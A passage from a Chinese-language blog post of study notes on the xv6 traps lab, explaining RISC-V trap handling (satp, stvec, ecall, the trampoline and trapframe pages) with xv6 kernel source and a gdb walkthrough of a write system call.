t0</span><br></pre></td></tr></table></figure><p>这里解释一下<code>satp</code>寄存器。<code>satp</code>寄存器用于监督模式下的地址转换和保护。这个寄存器包含根页表的物理页号（PPN）、一个地址空间标识符（ASID），以及选择当前地址转换方案的MODE字段。ASID用于基于每个地址空间的地址转换隔离，而PPN是根页表的监督物理地址除以4KiB的结果。</p><p>也即，<code>satp</code>寄存器指向<code>page table</code></p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-02-29%2012.01.53.png" alt="截屏2024-02-29 12.01.53"></p></li><li><p><code>usertrap()</code>处理来自用户空间的中断、异常或系统调用。由<code>trampoline.S</code>调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// handle an interrupt, exception, or system call from user space.</span></span><br><span class="line"><span class="comment">// called from trampoline.S</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">usertrap</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* 寄存器 sstatus 的 SSP 位指明 trap 是否来自用户态 */</span></span><br><span class="line">  <span class="keyword">if</span>((r_sstatus() &amp; SSTATUS_SPP) != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;usertrap: not from user mode&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send interrupts and exceptions to kerneltrap(),</span></span><br><span class="line">  <span class="comment">// since we&#x27;re now in the kernel.</span></span><br><span class="line">  w_stvec((uint64)kernelvec);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// save user program counter.</span></span><br><span class="line">  <span class="comment">// 在发生用户陷阱（user trap）时，硬件自动将用户程序计数器的值存储到sepc寄存器中。</span></span><br><span class="line">  <span class="comment">// 现在我们将该值存储到 trapframe 中以用于之后恢复现场</span></span><br><span class="line">  p-&gt;trapframe-&gt;epc = r_sepc();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(r_scause() == <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="comment">// system call</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(killed(p))</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sepc points to the ecall instruction,</span></span><br><span class="line">    <span class="comment">// but we want to return to the next instruction.</span></span><br><span class="line">    <span class="comment">// 因为系统调用时程序计数器指向 ecall 指令</span></span><br><span class="line">    <span class="comment">// trap处理完后要执行 ecall 指令的下一条指令</span></span><br><span class="line">    p-&gt;trapframe-&gt;epc += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// an interrupt will change sepc, scause, and sstatus,</span></span><br><span class="line">    <span class="comment">// so enable only now that we&#x27;re done with those registers.</span></span><br><span class="line">    intr_on();<span class="comment">// 允许supervisor interrupt</span></span><br><span class="line"></span><br><span class="line">    syscall();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>((which_dev = devintr()) != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// ok device interrupt</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123; <span class="comment">// exception</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, r_scause(), p-&gt;pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">    setkilled(p);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(killed(p))</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>)</span><br><span class="line">    yield();</span><br><span class="line">  usertrapret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>usertrapret()</code>用于返回到用户态</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// return to user space</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">usertrapret</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// we&#x27;re about to switch the destination of traps from</span></span><br><span class="line">  <span class="comment">// kerneltrap() to usertrap(), so turn off interrupts until</span></span><br><span class="line">  <span class="comment">// we&#x27;re back in user space, where usertrap() is correct.</span></span><br><span class="line">  <span class="comment">// 在回到用户态之前，禁用所有中断</span></span><br><span class="line">  intr_off();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send syscalls, interrupts, and exceptions to uservec in trampoline.S</span></span><br><span class="line">  uint64 trampoline_uservec = TRAMPOLINE + (uservec - trampoline);</span><br><span class="line">  w_stvec(trampoline_uservec);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set up trapframe values that uservec will need when</span></span><br><span class="line">  <span class="comment">// the process next traps into the kernel.</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_satp = r_satp();         <span class="comment">// kernel page table</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_sp = p-&gt;kstack + PGSIZE; <span class="comment">// process&#x27;s kernel stack</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_trap = (uint64)usertrap;</span><br><span class="line">  p-&gt;trapframe-&gt;kernel_hartid = r_tp();         <span class="comment">// hartid for cpuid()</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// set up the registers that trampoline.S&#x27;s sret will use</span></span><br><span class="line">  <span class="comment">// to get to user space.</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// set S Previous Privilege mode to User.</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> x = r_sstatus();</span><br><span class="line">  x &amp;= ~SSTATUS_SPP; <span class="comment">// clear SPP to 0 for user mode</span></span><br><span class="line">  x |= SSTATUS_SPIE; <span class="comment">// enable interrupts in user mode</span></span><br><span class="line">  w_sstatus(x);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set S Exception Program Counter to the saved user pc.</span></span><br><span class="line">  w_sepc(p-&gt;trapframe-&gt;epc);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// tell trampoline.S the user page table to switch to.</span></span><br><span class="line">  uint64 satp = MAKE_SATP(p-&gt;pagetable);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// jump to userret in trampoline.S at the top of memory, which </span></span><br><span class="line">  <span class="comment">// switches to the user page table, restores user registers,</span></span><br><span class="line">  <span class="comment">// and switches to user mode with sret.</span></span><br><span class="line">  uint64 trampoline_userret = TRAMPOLINE + (userret - trampoline);</span><br><span class="line">  ((<span class="type">void</span> (*)(uint64))trampoline_userret)(satp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>userret</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">.globl userret</span><br><span class="line">userret:</span><br><span class="line">        # userret(pagetable)</span><br><span class="line">        # called by usertrapret() in trap.c to</span><br><span class="line">        # switch from kernel to user.</span><br><span class="line">        # a0: user page table, for satp.</span><br><span class="line"></span><br><span class="line">        # switch to the user page table.</span><br><span class="line">        sfence.vma zero, zero</span><br><span class="line">        csrw satp, a0</span><br><span class="line">        sfence.vma zero, zero</span><br><span class="line"></span><br><span class="line">        li a0, TRAPFRAME</span><br><span class="line"></span><br><span class="line">        # restore all but a0 from TRAPFRAME</span><br><span class="line">        ld ra, 40(a0)</span><br><span class="line">        ld sp, 48(a0)</span><br><span class="line">        ld gp, 56(a0)</span><br><span class="line">        ld tp, 64(a0)</span><br><span class="line">        ld t0, 72(a0)</span><br><span class="line">        ld t1, 80(a0)</span><br><span class="line">        ld t2, 88(a0)</span><br><span class="line">        ld s0, 96(a0)</span><br><span class="line">        ld s1, 104(a0)</span><br><span class="line">        ld a1, 120(a0)</span><br><span class="line">        ld a2, 128(a0)</span><br><span class="line">        ld a3, 136(a0)</span><br><span class="line">        ld a4, 144(a0)</span><br><span class="line">        ld a5, 152(a0)</span><br><span class="line">        ld a6, 160(a0)</span><br><span class="line">        ld a7, 168(a0)</span><br><span class="line">        ld s2, 176(a0)</span><br><span class="line">        ld s3, 184(a0)</span><br><span class="line">        ld s4, 192(a0)</span><br><span class="line">        ld s5, 200(a0)</span><br><span class="line">        ld s6, 208(a0)</span><br><span class="line">        ld s7, 216(a0)</span><br><span class="line">        ld s8, 224(a0)</span><br><span class="line">        ld s9, 232(a0)</span><br><span class="line">        ld s10, 240(a0)</span><br><span class="line">        ld s11, 248(a0)</span><br><span class="line">        ld t3, 256(a0)</span><br><span class="line">        ld t4, 264(a0)</span><br><span class="line">        ld t5, 272(a0)</span><br><span class="line">        ld t6, 280(a0)</span><br><span class="line"></span><br><span class="line"># restore user a0</span><br><span class="line">        ld a0, 112(a0)</span><br><span class="line">        </span><br><span class="line">        # return to user mode and user pc.</span><br><span class="line">        # usertrapret() set up sstatus and sepc.</span><br><span class="line">        sret</span><br></pre></td></tr></table></figure></li></ul><h3 id="ECALL-指令之前的状态"><a href="#ECALL-指令之前的状态" class="headerlink" title="ECALL 指令之前的状态"></a>ECALL 指令之前的状态</h3><p>跟踪一个xv6的系统调用，也就是Shell将它的提示信息通过write系统调用走到操作系统再输出到console的过程。</p><p>在代码<code>sh.c</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">getcmd</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> nbuf)</span></span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;$ &quot;</span>, <span class="number">2</span>); <span class="comment">// write 系统调用</span></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, nbuf);</span><br><span class="line">  gets(buf, nbuf);</span><br><span class="line">  <span class="keyword">if</span>(buf[<span class="number">0</span>] == <span class="number">0</span>) <span class="comment">// EOF</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动<code>gdb</code>。</p><p>作为用户代码的<code>Shell</code>调用<code>write</code>时，实际上调用的是关联到<code>Shell</code>一个库函数。查看这个库的源代码，在<code>usys.S</code>中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.global write</span><br><span class="line">write:</span><br><span class="line"> li a7, SYS_write# 将SYS_write 加载到 寄存器a7 中</span><br><span class="line"> ecall# 执行ecall指令</span><br><span class="line"> ret</span><br></pre></td></tr></table></figure><p>我们通过在ecall指令处放置一个断点展示系统调用，为了放置断点，我们首先要知道指令地址，查看<code>XV6</code>编译过程产生的<code>sh.asm</code>找出这个地址。<code>sh.asm</code>是带有指令地址的汇编代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000000e2c &lt;write&gt;:</span><br><span class="line">.global write</span><br><span class="line">write:</span><br><span class="line"> li a7, SYS_write</span><br><span class="line">     e2c:48c1                lia7,16</span><br><span class="line"> ecall</span><br><span class="line">     e2e:00000073          ecall</span><br><span class="line"> ret</span><br><span class="line">     e32:8082                ret</span><br></pre></td></tr></table></figure><p>在<code>ecall</code>指令处放置一个断点，这条指令的地址是<code>0xe2e</code>。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2010.05.14.png" alt="截屏2024-03-01 10.05.14"></p><p>从<code>gdb</code>中，我们看到下一条要执行的指令就是<code>ecall</code>。打印并检查程序计数器，确实是在<code>0xe2e</code>的位置。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2010.07.06.png" alt="截屏2024-03-01 10.07.06"></p><p>通过<code>info reg</code>打印全部用户寄存器。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2010.10.28.png" alt="截屏2024-03-01 10.10.28"></p><p><code>a0 a1 a2</code>是<code>Shell</code>传递给<code>write</code>系统调用的参数。所以<code>a0</code>是文件描述符<code>2</code>，<code>a1</code>是<code>Shell</code>想要写入字符串的指针，<code>a2</code>是想要写入的字符数。还可以通过打印<code>Shell</code>想要写入的字符串内容，来证明断点停留在我们认为它应该停在的位置。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2010.14.21-9259264.png" alt="截屏2024-03-01 10.14.21"></p><p>一个美元符号和一个空格。</p><p>值得注意的是，寄存器中程序计数器<code>pc</code>和堆栈指针<code>sp</code>（上图没显示全<code>sp = 0x4f80</code>都在距离0较近的地址，这进一步说明当前代码运行在用户空间，因为<strong>用户空间中所有地址都比较小</strong>，一旦进入内核，<strong>内核会使用大得多的内存空间</strong>。</p><p>系统调用的时间点会有大量状态的变更，其中一个最重要的需要变更的状态，并且在它变更之前我们对它还有依赖的，就是当前的<code>page table</code>。可以查看<code>SATP</code>寄存器。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2010.20.40.png" alt="截屏2024-03-01 10.20.40"></p><p>这是物理内存地址，它并没有说明有关<code>page table</code>中的映射关系是什么，<code>page table</code>长什么样。<code>QEMU</code>中有一个方法可以打印当前<code>page table</code>。从<code>QEMU</code>界面中输入<code>ctrl a + c</code>可以进入到<code>QEMU</code>的<code>console</code>，之后输入<code>info mem</code>，<code>QEMU</code>会打印完整的<code>page table</code>。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2011.03.07.png" alt="截屏2024-03-01 11.03.07"></p><p>接着在<code>Shell</code>中打印出<code>write</code>函数的内容。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2010.30.34.png" alt="截屏2024-03-01 10.30.34"></p><p>程序计数器现在指向<code>ecall</code>指令，我们接下来要执行<code>ecall</code>指令。现在我们还在用户空间，但是即将进入内核空间了。</p><h3 id="ECALL指令之后的状态"><a href="#ECALL指令之后的状态" class="headerlink" title="ECALL指令之后的状态"></a><code>ECALL</code>指令之后的状态</h3><p>执行<code>ecall</code>指令，</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2011.16.13.png" alt="截屏2024-03-01 11.16.13"></p><p>看到程序计数器的值变为一个大得多的地址。但是通过<code>QEMU</code>执行<code>info mem</code>后发现<code>page table</code>并没有改变。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2011.16.33.png" alt="截屏2024-03-01 11.16.33"></p><p>在<code>memlayout.h</code>中定义了<code>TRAMPOLINE</code>和<code>TRAPFRAME</code>的物理地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// map the trampoline page to the highest address,</span></span><br><span class="line"><span class="comment">// in both user and kernel space.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRAMPOLINE (MAXVA - PGSIZE)</span></span><br><span class="line"><span class="comment">// User memory layout.</span></span><br><span class="line"><span class="comment">// Address zero first:</span></span><br><span class="line"><span class="comment">//   text</span></span><br><span class="line"><span class="comment">//   original data and bss</span></span><br><span class="line"><span class="comment">//   fixed-size stack</span></span><br><span class="line"><span class="comment">//   expandable heap</span></span><br><span class="line"><span class="comment">//   ...</span></span><br><span class="line"><span class="comment">//   USYSCALL (shared with kernel)</span></span><br><span class="line"><span class="comment">//   TRAPFRAME (p-&gt;trapframe, used by the trampoline)</span></span><br><span class="line"><span class="comment">//   TRAMPOLINE (the same page as in the kernel)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRAPFRAME (TRAMPOLINE - PGSIZE)</span></span><br></pre></td></tr></table></figure><p>在<code>riscv.h</code>中定义了<code>MAXVA</code>，<code>MAXVA = 0x40 0000 0000</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// one beyond the highest possible virtual address.</span></span><br><span class="line"><span class="comment">// MAXVA is actually one bit less than the max allowed by</span></span><br><span class="line"><span class="comment">// Sv39, to avoid having to sign-extend virtual addresses</span></span><br><span class="line"><span class="comment">// that have the high bit set.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXVA (1L &lt;&lt; (9 + 9 + 9 + 12 - 1))</span></span><br></pre></td></tr></table></figure><p>因此我们得到<code>TRAMPOLINE = 0x3f ffff f000</code>，<code>TRAPFRAM = 0x3f ffff e000</code>。</p><p>程序计数器指示代码正在<code>trampoline page</code>得最开始，这是用户内存中一个非常大的地址。我们可以查看一下将要运行的指令。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2011.19.56.png" alt="截屏2024-03-01 11.19.56"></p><p>这些指令是内核在<code>supervisor mode</code>中将要执行的最开始的几条指令，也是在<code>trap</code>机制中最开始要执行的几条指令。</p><p>查看寄存器:</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2011.28.24.png" alt="截屏2024-03-01 11.28.24"></p><p>发现并没有变化，这里还是用户程序拥有的一些寄存器内容。所以现在寄存器里还是用户程序的数据，并且这些数据也还只保存在这些寄存器中，所以我们将这些寄存器的值保存在某处之前，<strong>我们在这个时间点不能使用任何寄存器</strong>，内核会覆盖寄存器内的用户数据，之后如果我们尝试要恢复用户程序，我们就不能回复寄存器中的正确数据，用户程序执行将会出错。</p><p>我们现在所在的地址为<code>0x3f ffff ffff</code>，这是<code>page table</code>的最后一个<code>page</code>，这是<code>trampoline page</code>。我们现在正在<code>trampoline page</code>中执行程序，这个<code>page</code>包含了内核的<code>trap</code>处理代码。**<code>ecall</code>并不会切换<code>page table</code>，这是<code>ecall</code>指令非常重要的一个特点。**所以这意味着，<code>trap</code>处理代码必须存在于每个<code>user page table</code>中。因为<code>ecall</code>并不会切换<code>page table</code>，我们需要在<code>user page table</code>中的某个地方来执行最初的内核代码。而这个<code>trampoline page</code>，是由内核小心映射到每一个<code>user page table</code>中，以使我们仍然在使用<code>user page table</code>时，内核在一个地方能够执行<code>trap</code>机制的最开始的一些指令。</p><p>这里的控制是通过<code>stvec</code>寄存器完成的，这是一个只能在<code>supervisor mode</code>下读写的特权寄存器。在从内核空间进入到用户空间之前，内核会设置好<code>stvec</code>寄存器指向内核希望<code>trap</code>代码允许的位置。</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2011.47.27-9264852.png" alt="截屏2024-03-01 11.47.27"></p><p>如图所示，内核已经事先设置好了<code>STVEC</code>寄存器的内容为<code>0x3f ffff f000</code>，这就是<code>trampoline page</code>的起始位置。<code>STVEC</code>寄存器的内容，就是在<code>ecall</code>指令执行之后，我们会在这个特定地址执行指令的原因。</p><p>即使<code>trampoline page</code>是在用户地址空间的<code>user page table</code>完成的映射，用户代码不能写它，因为这些<code>page</code>对应的<code>PTE</code>并没有设置<code>PTE_u</code>标志位。因此<code>trap</code>机制是安全的。</p><p>虽然一直说已经在supervisor mode 中了，但是实际上并没有任何能直接确认当前在哪种mode下的方法。不过我们的确发现程序计数器正在<code>trampoline page</code>执行代码，而这些page对应的PTE并没有设置PTE_u标识位。所以现在只有当代码在supervisor mode时，才可能在程序运行的同时而不崩溃。所以我们推导出当前必然在<code>supervisor mode</code></p><p>通过<code>ecall</code>走到<code>trampoline page</code>，<code>ecall</code>实际上指改变三件事：</p><p>第一，<code>ecall</code>将代码从<code>user mode</code>改到<code>supervisor mode</code></p><p>第二，<code>ecall</code>将程序计数器的值保存在<code>sepc</code>寄存器。通过打印程序计数器看到这里的效果，</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-01%2013.29.24.png" alt="截屏2024-03-01 13.29.24"></p><p>尽管其他的寄存器还是原来用户寄存器的值，但是这里的程序计数器明显已经不是用户代码的程序计数器了。这里的程序计数器是从<code>stvec</code>寄存器拷贝过来的值。我们打印<code>sepc</code>寄存器，这是<code>ecall</code>保存用户程序计数器的地方。</p><p>这个寄存器里面有熟悉的地址<code>0xe2e</code>，这是<code>ecall</code>指令在用户空间的地址。所以<code>ecall</code>至少保存了程序计数器的数值。</p><p>第三，<code>ecall</code>会跳转到<code>stvec</code>寄存器指向的指令。</p><p>所以现在，ecall 帮我们做了一点点工作，但实际上我们离执行内核中的c代码还差的很远。接下来：</p><ul><li>我们需要保存32个用户寄存器的内容，这样当我们想要恢复用户代码执行时，我们才能恢复这些寄存器的内容。</li><li>因为现在我们还在user page table，我们需要切换到kernel page table</li><li>我们需要创建或者找到一个kernel stack，并将stack pointer 寄存器的内容指向那个kernel stack。这样才能给c代码提供栈。</li><li>我们还需要跳转到内核中c代码的某些合理的位置。</li></ul><p>然而<code>ecall</code>并不会做这里的任何一件事。</p><p>当然可以通过修改硬件让<code>ecall</code>完成这些工作，而不是交给软件完成。并且，我们也将会看到，在软件中完成这些工作并不是特别简单。那为什么<code>ecall</code>不多做点工作来讲代码执行从用户态切换到内核空间呢？为什么ecall不会保存用户寄存器，或者切换<code>page table</code>的指针来指向<code>kernel page table</code>，或者自动的设置<code>Stack Pointer</code>指向<code>kernel stack</code>，或者直接跳转到kernel的c代码，而不是在这里运行复杂的汇编代码？</p><p>实际上，有的机器在执行系统调用时，会在硬件中完成所有这些工作。但是<code>RISC-V</code>并不会，<code>RISC-V</code>秉持了这样一个观点：ecall只完成尽量少必须要完成的工作，其他的工作都交给软件完成。这里的原因是，RISC-V设计者想要为软件和操作系统的程序员提供最大的灵活性，这样他们就能按照他们想要的方式开发操作系统。所以你可以这样想，尽管XV6并没有使用这里提供的灵活性，但是一些其他操作系统用到了。</p><ul><li>举个例子，因为这里的ecall是如此简单，或许某些操作系统可以在不切换page table的前提下，执行部分系统调用。切换page table的代价比较高，如果ecall打包完成了这部分工作，那就不能对一些系统调用进行改进，使其不用在不必要的场景切换page table。</li><li>某些操作系统同时将user和kernel的虚拟地址映射到一个page table中，这样在user和kernel之间切换时根本就不需要切换page table。对于这样的操作系统来说，如果ecall切换了page table那将会是一种浪费，并且也减慢了程序的运行。</li><li>或许在一些系统调用过程中，一些寄存器不用保存，而哪些寄存器需要保存，哪些不需要，取决于软件，编程语言和编译器。通过不保存所有的32个寄存器获取可以节省大量的程序运行时间，所以你不会想ecall迫使你保存所有的寄存器。</li><li>最后，对于某些简单的系统调用或许根本就不要任何stack，所以对于一些非常关注性能的操作系统，ecall不会自动位你完成stack切换是极好的。</li></ul><p>所以，ecall尽量的简单可以提升软件设计的灵活性。</p><p>在代码或者gdb中看不到ecall的具体内容的原因：</p><p><strong>ecall实际上是cpu的指令，自然在gdb或者代码中看不到具体内容</strong></p><h3 id="uservec函数"><a href="#uservec函数" class="headerlink" title="uservec函数"></a>uservec函数</h3><p>在ecall指令执行后，现在程序位于trampoline page的起始，也就是<code>uservec</code>函数的起始。现在需要做的第一件事就是保存寄存器内容。</p><p>在一些机器中，可以直接将寄存器中的内容写到物理内存的合适位置。但是我们不能在<code>RISC-V</code>中这样做，因为在RISV-V中，supervisor mode下的代码不允许直接访问物理内存。所以只能使用page table中的内容，但是从输出来看（见下文**<code>ECALL</code>指令之后的状态**），page table中也没有多少内容。</p><p>虽然xv6并没有使用，但是另一种可能的操作是，直接讲satp寄存器指向kernel page table，之后我们就可以直接使用所有的kernel mapping来帮助我们存储用户寄存器。这是合法的，因为supervisor mode可以更改satp寄存器。但是在trap机制的最开始，我们并不知道kernel page table的地址。并且更改satp寄存器的指令，要求写入satp寄存器的内容来自于另一个寄存器。所以，位了能执行更新page table的指令，我们需要一些空闲寄存器，这样才能先将page table的地址存在这些寄存器中，然后再执行修改satp寄存器的指令。</p><p>对于保存用户寄存器，XV6在RISC-V上的实现包括了两个部分。第一个部分是，XV6在每个user page table映射了trapframe page，这样每个进程都有自己的trapframe page。这个page包含了很多有趣的数据，但是现在最重要的数据是用来保存用户寄存器的32个空槽位。所以，在trap处理代码中，现在的好消息是，我们在user page table有一个之前由kernel设置好的映射关系，这个映射关系指向了一个可以用来存放这个进程的用户寄存器的内存位置。这个位置的虚拟地址总是0x3ffffffe000。</p><p>xv6的trapframe中存储了如下信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 